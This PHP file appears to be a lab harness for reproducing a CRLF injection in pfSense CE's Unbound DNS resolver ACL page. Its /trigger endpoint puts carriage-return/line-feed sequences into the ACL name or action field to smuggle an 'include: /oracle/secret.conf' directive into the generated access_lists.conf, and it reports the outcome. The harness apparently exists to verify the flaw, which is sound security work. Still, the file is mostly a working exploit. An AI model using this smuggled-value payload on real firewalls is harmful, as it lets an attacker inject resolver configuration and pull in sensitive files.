<?php
/* pfSense CE 2.9.0-DEVELOPMENT Unbound ACL name/action CRLF gadget. Pin 9363ac5. */

require __DIR__ . '/stubs.php';
require __DIR__ . '/pin-src/globals.inc.excerpt.php';
require __DIR__ . '/pin-src/util.inc.excerpt.php';
require __DIR__ . '/pin-src/unbound.inc.excerpt.php';
require __DIR__ . '/pin-src/services_unbound_acls.php.excerpt.php';

const WITNESS = 'PFSENSE-UNBOUND-ACL-CRLF-WITNESS';
const WITNESS_PATH = '/oracle/PFSENSE-UNBOUND-ACL-CRLF-WITNESS';
const SECRET_PATH = '/oracle/secret.conf';
const PIN_SHA = '9363ac5b8651a1c7a333180425ce7719070f95f9';
const PIN_VERSION = '2.9.0-DEVELOPMENT';
const PRIVILEGE = 'page-services-dnsresolver-acls';
const CONTROL_NAME = 'lan';
const CONTROL_ACTION = 'allow';
const CONTROL_NET = '192.168.1.0';
const CONTROL_MASK = '24';
const INCLUDE_LINE = 'include: /oracle/secret.conf';

ini_set('display_errors', '0');

function lab_reset_runtime(): void {
	global $config, $g, $id, $input_errors, $networkacl, $retval;
	$g['unbound_chroot_path'] = '/var/unbound';
	$config = array(
		'unbound' => array(
			'enable' => true,
			'disable_auto_added_access_control' => true,
			'acls' => array(),
		),
	);
	$id = null;
	$input_errors = array();
	$networkacl = array();
	$retval = 0;
	$GLOBALS['lab_logs'] = array();
	$GLOBALS['lab_write_config'] = false;
	$GLOBALS['lab_write_desc'] = '';
	$GLOBALS['lab_mwexec'] = array();
	$GLOBALS['lab_dirty'] = array();
	$GLOBALS['lab_checkconf_calls'] = 0;
	$GLOBALS['lab_header'] = '';
	@unlink(WITNESS_PATH);
	@unlink('/var/unbound/access_lists.conf');
	@unlink('/var/unbound/unbound.conf');
}

function witness_state(): array {
	$exists = is_file(WITNESS_PATH);
	$body = '';
	if ($exists) {
		$read = file_get_contents(WITNESS_PATH);
		$body = ($read === false) ? '' : $read;
	}
	return array(
		'exists' => $exists,
		'body' => $body,
		'path' => WITNESS_PATH,
	);
}

function send_json($status, $payload): void {
	http_response_code($status);
	header('Content-Type: application/json; charset=utf-8');
	echo json_encode($payload, JSON_UNESCAPED_SLASHES);
	exit(0);
}

function send_text($status, $body): void {
	http_response_code($status);
	header('Content-Type: text/plain; charset=utf-8');
	echo $body;
	exit(0);
}

function request_json(): array {
	static $decoded = null;
	static $read = false;
	if ($read) {
		return is_array($decoded) ? $decoded : array();
	}
	$read = true;
	$raw = file_get_contents('php://input');
	if (!is_string($raw) || $raw === '') {
		$decoded = array();
		return $decoded;
	}
	$parsed = json_decode($raw, true);
	$decoded = is_array($parsed) ? $parsed : array();
	return $decoded;
}

function request_field(string $key, string $default = ''): string {
	if (isset($_POST[$key]) && is_string($_POST[$key])) {
		return $_POST[$key];
	}
	if (isset($_GET[$key]) && is_string($_GET[$key])) {
		return $_GET[$key];
	}
	$body = request_json();
	if (isset($body[$key]) && is_string($body[$key])) {
		return $body[$key];
	}
	return $default;
}

function pin_source_blob(): string {
	$parts = array();
	foreach (array(
		'services_unbound_acls.php.excerpt.php',
		'unbound.inc.excerpt.php',
	) as $name) {
		$path = __DIR__ . '/pin-src/' . $name;
		$body = file_get_contents($path);
		if ($body === false) {
			$body = '';
		}
		$parts[] = "===== {$name} =====\n" . $body;
	}
	return implode("\n", $parts);
}

function conf_body(string $path): string {
	if (!is_file($path)) {
		return '';
	}
	$read = file_get_contents($path);
	return ($read === false) ? '' : $read;
}

function include_lines(string $body): array {
	$hits = array();
	foreach (preg_split("/\r\n|\n|\r/", $body) as $line) {
		$trim = trim($line);
		if (str_starts_with($trim, 'include:') || str_starts_with($trim, 'include-toplevel:')) {
			$hits[] = $trim;
		}
	}
	return $hits;
}

function access_control_count(string $body): int {
	$count = 0;
	foreach (preg_split("/\r\n|\n|\r/", $body) as $line) {
		if (str_starts_with(trim($line), 'access-control:')) {
			$count++;
		}
	}
	return $count;
}

function run_acl_case(string $aclname, string $aclaction): array {
	global $input_errors, $g;
	lab_reset_runtime();
	$_POST = array(
		'save' => 'Save',
		'aclid' => '1',
		'aclname' => $aclname,
		'aclaction' => $aclaction,
		'description' => 'lab',
		'acl_network0' => CONTROL_NET,
		'mask0' => CONTROL_MASK,
		'description0' => '',
	);
	$saved = unbound_acl_page_save();
	if (!isset($input_errors) || !is_array($input_errors)) {
		$input_errors = array();
	}
	$checkconf_after_save = (int) $GLOBALS['lab_checkconf_calls'];
	$applied = unbound_acl_page_apply();
	$acl_body = conf_body("{$g['unbound_chroot_path']}/access_lists.conf");
	$conf_body = conf_body("{$g['unbound_chroot_path']}/unbound.conf");
	return array(
		'ok' => true,
		'saved' => (bool) $saved,
		'apply_retval' => $applied,
		'errors' => is_array($input_errors) ? $input_errors : array(),
		'write_config' => (bool) $GLOBALS['lab_write_config'],
		'write_desc' => $GLOBALS['lab_write_desc'],
		'checkconf_calls' => (int) $GLOBALS['lab_checkconf_calls'],
		'checkconf_after_save' => $checkconf_after_save,
		'aclname' => $aclname,
		'aclaction' => $aclaction,
		'access_lists' => $acl_body,
		'unbound_conf' => $conf_body,
		'access_control_count' => access_control_count($acl_body),
		'include_lines' => include_lines($acl_body),
		'mwexec' => $GLOBALS['lab_mwexec'],
		'privilege' => PRIVILEGE,
		'witness' => witness_state(),
		'secret_exists' => is_file(SECRET_PATH),
	);
}

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
if (!is_string($path) || $path === '') {
	$path = '/';
}

if ($path === '/health' || $path === '/health.php') {
	header('Content-Type: text/plain; charset=utf-8');
	echo "ok\n";
	exit(0);
}

if ($path === '/ping') {
	$which = trim((string) shell_exec('command -v unbound'));
	send_json(200, array(
		'ok' => true,
		'pong' => 'pong',
		'version' => PIN_VERSION,
		'sha' => PIN_SHA,
		'privilege' => PRIVILEGE,
		'exec' => function_exists('exec'),
		'which_unbound' => $which,
		'witness_path' => WITNESS_PATH,
		'secret_path' => SECRET_PATH,
	));
}

if ($path === '/source') {
	send_text(200, pin_source_blob());
}

if ($path === '/control') {
	$result = run_acl_case(CONTROL_NAME, CONTROL_ACTION);
	$result['case'] = 'control';
	send_json(200, $result);
}

if ($path === '/trigger') {
	$field = request_field('field', 'action');
	if ($field === 'name') {
		$name = CONTROL_NAME . "\r\n" . INCLUDE_LINE . "\r\n#";
		$action = CONTROL_ACTION;
	} else {
		$field = 'action';
		$name = CONTROL_NAME;
		$action = CONTROL_ACTION . "\r\n" . INCLUDE_LINE;
	}
	$result = run_acl_case($name, $action);
	$result['case'] = 'trigger';
	$result['field'] = $field;
	send_json(200, $result);
}

if ($path === '/oracle') {
	send_json(200, witness_state());
}

send_json(404, array('error' => 'not-found', 'path' => $path));
